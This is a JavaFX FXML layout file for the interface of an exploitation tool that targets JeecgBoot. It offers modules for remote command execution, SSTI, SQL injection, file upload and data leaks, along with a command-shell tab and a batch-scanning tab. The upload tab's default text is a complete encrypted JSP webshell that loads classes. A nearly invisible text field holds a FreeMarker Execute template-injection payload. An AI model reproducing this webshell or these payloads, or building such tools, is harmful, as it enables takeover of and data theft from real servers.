<?xml version="1.0" encoding="UTF-8"?>

<?import java.lang.String?>
<?import javafx.collections.FXCollections?>
<?import javafx.scene.control.Button?>
<?import javafx.scene.control.ComboBox?>
<?import javafx.scene.control.Label?>
<?import javafx.scene.control.Tab?>
<?import javafx.scene.control.TabPane?>
<?import javafx.scene.control.TextArea?>
<?import javafx.scene.control.TextField?>
<?import javafx.scene.layout.AnchorPane?>

<AnchorPane prefHeight="936.0" prefWidth="1448.0" xmlns="http://javafx.com/javafx/8.0.171" xmlns:fx="http://javafx.com/fxml/1" fx:controller="ff">
   <children>


       <ComboBox fx:id="comboBox" layoutX="526.0" layoutY="32.0" prefHeight="30.0" prefWidth="400.0" promptText="选择模块" visibleRowCount="20">
           <items>
               <FXCollections fx:factory="observableArrayList">

                   <String fx:value="all" />
                   <String fx:value="jeecg-boot queryFieldBySql远程命令执行漏洞" />
                   <String fx:value="jeecg-boot testConnection远程命令执行漏洞" />
                   <String fx:value="JeecgBoot jmreport/loadTableData SSTI模板注入漏洞" />
                   <String fx:value="jeecg-boot-queryTableData-sqli注入漏洞" />
                   <String fx:value="jeecg-boot-getDictItemsByTable-sqli注入漏洞" />
                   <String fx:value="Jeecg-Boot qurestSql-SQL注入漏洞" />
                   <String fx:value="jeecg-boot commonController 任意文件上传漏洞" />
                   <String fx:value="jeecg-boot jmreport任意文件上传漏洞" />
                   <String fx:value="jeecg-boot-querySysUser信息泄露漏洞" />
                   <String fx:value="jeecg-boot-checkOnlyUser信息泄露漏洞" />
                   <String fx:value="jeecg-boot-httptrace信息泄露漏洞" />

               </FXCollections>
           </items>
       </ComboBox>
       <ComboBox fx:id="comboBoxdgfd" layoutX="526.0" layoutY="94.0" prefHeight="30.0" prefWidth="400.0" promptText="选择模块">
           <items>
               <FXCollections fx:factory="observableArrayList">
                   <String fx:value="all" />
                   <String fx:value="jeecg-boot-querySysUser信息泄露漏洞" />
                   <String fx:value="jeecg-boot-checkOnlyUser信息泄露漏洞" />
               </FXCollections>
           </items>
       </ComboBox>



       <Label layoutX="20.0" layoutY="37.0" text="目标:" />
      <TextField fx:id="test1" layoutX="65.0" layoutY="32.0" prefHeight="30.0" prefWidth="360.0" />
      <Label layoutX="440.0" layoutY="37.0" text="默认模块:" />
      <Button layoutX="950.0" layoutY="32.0" mnemonicParsing="false" onAction="#rce" prefHeight="30.0" prefWidth="154.0" text="检测" />
      <Button layoutX="1141.0" layoutY="32.0" mnemonicParsing="false" onAction="#rce1" prefHeight="30.0" prefWidth="131.0" text="清空面板" />
      <TabPane layoutX="9.0" layoutY="156.0" prefHeight="800.0" prefWidth="1456.0" tabClosingPolicy="UNAVAILABLE">
        <tabs>
          <Tab text="检测日志">
            <content>
              <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="771.0" prefWidth="1480.0">
                     <children>
                        <TextArea fx:id="test2" layoutX="2.0" layoutY="7.0" prefHeight="754.0" prefWidth="1447.0" />
                     </children></AnchorPane>
            </content>
          </Tab>
          <Tab text="Cmdshell">
            <content>
              <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                     <children>
                        <Label layoutX="461.0" layoutY="41.0" text="cmd：" />
                        <Button layoutX="943.0" layoutY="36.0" mnemonicParsing="false" onAction="#rce5" prefHeight="30.0" prefWidth="154.0" text="执行" />
                        <TextField fx:id="cmd1" layoutX="517.0" layoutY="36.0" prefHeight="30.0" prefWidth="400.0" />
                        <Label layoutX="38.0" layoutY="41.0" text="模块:" />
                  
                         <ComboBox fx:id="comboBox3" layoutX="83.0" layoutY="36.0" prefHeight="30.0" prefWidth="360.0" promptText="all">
                             <items>
                                 <FXCollections fx:factory="observableArrayList">
                                     <String fx:value="jeecg-boot queryFieldBySql远程命令执行漏洞" />
                                     <String fx:value="jeecg-boot testConnection远程命令执行漏洞" />
                                     <String fx:value="JeecgBoot jmreport/loadTableData SSTI模板注入漏洞" />
                                 </FXCollections>
                             </items>
                         </ComboBox>

                         <TextArea fx:id="testss" layoutX="6.0" layoutY="82.0" prefHeight="687.0" prefWidth="1443.0" wrapText="true" />
                     </children></AnchorPane>
            </content>
          </Tab>
            <Tab text="文件上传">
               <content>
                  <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                     <children>
                        <Button layoutX="814.0" layoutY="38.0" mnemonicParsing="false" onAction="#jeecggetshells" prefHeight="30.0" prefWidth="131.0" text="上传" />
                        <Label layoutX="26.0" layoutY="43.0" text="模块利用:" />
                        <Label layoutX="14.0" layoutY="529.0" text="传输日志:" />
                  
                         <ComboBox fx:id="comboBoxshell" layoutX="101.0" layoutY="38.0" prefHeight="30.0" prefWidth="347.0" promptText="all">
                             <items>
                                 <FXCollections fx:factory="observableArrayList">
                                     <String fx:value="jeecg-boot commonController 任意文件上传漏洞" />
                                     <String fx:value="jeecg-boot jmreport任意文件上传漏洞" />
                                 </FXCollections>
                             </items>
                         </ComboBox>
                        <TextArea fx:id="testdfdf" layoutX="8.0" layoutY="84.0" prefHeight="423.0" prefWidth="1439.0" text="&lt;%! String xc=&quot;3c6e0b8a9c15224a&quot;; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); }catch (Exception e){return null; }}%&gt;&lt;%try{byte[] data=new byte[Integer.parseInt(request.getHeader(&quot;Content-Length&quot;))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);if (session.getAttribute(&quot;payload&quot;)==null){session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(&quot;parameters&quot;, data);Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}%&gt;" wrapText="true" />
                        <Label layoutX="483.0" layoutY="43.0" text="文件名:" />
                        <TextField fx:id="dsffsf" layoutX="562.0" layoutY="38.0" prefHeight="30.0" prefWidth="228.0" />
                        <TextArea fx:id="tedasfa" layoutX="9.0" layoutY="564.0" prefHeight="200.0" prefWidth="1437.0" wrapText="true" />
                     </children></AnchorPane>
               </content>
            </Tab>
            <Tab text="批量检查">
               <content>
                  <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                     <children>
                        <Label layoutX="23.0" layoutY="26.0" text="模块选择：" />
                        <TextArea fx:id="test3" layoutX="4.0" layoutY="75.0" prefHeight="695.0" prefWidth="1445.0" />
                  
                         <ComboBox fx:id="comboBox1" layoutX="106.0" layoutY="21.0" prefHeight="30.0" prefWidth="499.0" promptText="all">
                             <items>
                                 <FXCollections fx:factory="observableArrayList">
                                     <String fx:value="jeecg-boot queryFieldBySql远程命令执行漏洞" />
                                     <String fx:value="jeecg-boot testConnection远程命令执行漏洞" />
                                     <String fx:value="JeecgBoot jmreport/loadTableData SSTI模板注入漏洞" />
                                     <String fx:value="jeecg-boot-queryTableData-sqli注入漏洞" />
                                     <String fx:value="jeecg-boot-getDictItemsByTable-sqli注入漏洞" />
                                     <String fx:value="Jeecg-Boot qurestSql-SQL注入漏洞" />
                                 </FXCollections>
                             </items>
                         </ComboBox>
                        <Button layoutX="643.0" layoutY="21.0" mnemonicParsing="false" onAction="#rce2" prefHeight="30.0" prefWidth="148.0" text="开始检查" />
                        <Button layoutX="825.0" layoutY="21.0" mnemonicParsing="false" onAction="#jeecgxian" prefHeight="30.0" prefWidth="154.0" text="结束线程" />
                        <Button layoutX="1009.0" layoutY="21.0" mnemonicParsing="false" onAction="#jeecgss" prefHeight="30.0" prefWidth="131.0" text="开始线程" />
                     </children></AnchorPane>
               </content>
            </Tab>
            <Tab text="漏洞说明">
               <content>
                  <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                     <children>
                        <TextArea layoutX="5.0" layoutY="10.0" prefHeight="756.0" prefWidth="1444.0" text="jeecg-boot queryFieldBySql远程命令执行漏洞是指JeecgBoot框架中的一个安全漏洞，该漏洞允许攻击者通过构造特定的HTTP请求，远程执行任意命令&#10;JeecgBoot的/jmreport/testConnection接口未进行身份验证，未对 dbUrl 参数进行限制，当应用端存在H2数据库驱动依赖时，攻击者发送包含恶意 dbUrl 参数的 http 请求远程执行任意代码&#10;Jeecg Boot jmreport/loadTableData接口存在FreeMarker SSTI注入漏洞，攻击者可以通过操纵应用程序的模板引擎来执行恶意代码或获取敏感信息。这种漏洞可能会导致整个应用程序被入侵，造成严重的安全问题&#10;jeecg-boot 3.5.0版本存在SQL注入漏洞，该漏洞源于文件 jmreport/qurestSql 存在安全问题， 通过参数 apiSelectId 导致SQL注入&#10;jeecg-boot-getDictItemsByTable-sqli 是指在使用 jeecg-boot 框架时，通过 getDictItemsByTable 方法进行数据字典查询时发生的 SQL 注入攻击。这是因为该方法没有对传入的表名进行足够的验证或清理，导致攻击者可以通过构造恶意输入执行未授权的数据库查询&#10;JEECG(J2EE Code Generation) 是开源的代码生成平台，目前官方已停止维护。由于 /api 接口鉴权时未过滤路径遍历，攻击者可构造包含 ../ 的url绕过鉴权。攻击者可构造恶意请求利用 commonController 接口进行文件上传攻击实现远程代码执行，导致服务器被控&#10;jeecg-boot jmreport任意文件上传漏洞指的是Jeecg-Boot是一个基于BATJ的快速开发平台，而Jmreport是Jeecg-Boot中用于报表设计的模块。在某些情况下，如果Jmreport的上传功能没有正确地限制上传文件的类型或进行安全校验，攻击者可能上传恶意文件，如恶意脚本或可执行文件，从而导致服务器安全受到威胁&#10;jeecg-boot-querySysUser信息泄露漏洞.该页面存在未授权访问漏洞，攻击者可访问该页面导致用户敏感信息泄露&#10;jeecg-boot-checkOnlyUser信息泄露漏洞，攻击者访问该页面导致敏感信息泄露漏洞&#10;jeecg-boot-httptrace信息泄露漏洞，未授权访问漏洞，攻击者访问httptrace可导致用户信息泄露 " wrapText="true" />
                     </children></AnchorPane>
               </content>
            </Tab>
        </tabs>
      </TabPane>
      <TextField fx:id="urldf" layoutX="1461.0" layoutY="478.0" prefHeight="30.0" prefWidth="11.0" text="{&quot;dbSource&quot;:&quot;&quot;,&quot;sql&quot;:&quot;select '&lt;#assign value=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt;${value(\&quot;echo 888888\&quot;)}'&quot;,&quot;tableName&quot;:&quot;test_demo);&quot;,&quot;pageNo&quot;:1,&quot;pageSize&quot;:10}" />
      <Button layoutX="950.0" layoutY="94.0" mnemonicParsing="false" onAction="#jeecgjiekou" prefHeight="30.0" prefWidth="154.0" text="接口测试" />
      <Label layoutX="20.0" layoutY="99.0" text="接口:" />
      <TextField fx:id="testdffd" layoutX="65.0" layoutY="94.0" prefHeight="30.0" prefWidth="360.0" />
      <Label layoutX="440.0" layoutY="99.0" text="接口模块:" />
      <Button layoutX="1141.0" layoutY="94.0" mnemonicParsing="false" prefHeight="30.0" prefWidth="131.0" text="漏洞说明" />
   </children>
</AnchorPane>
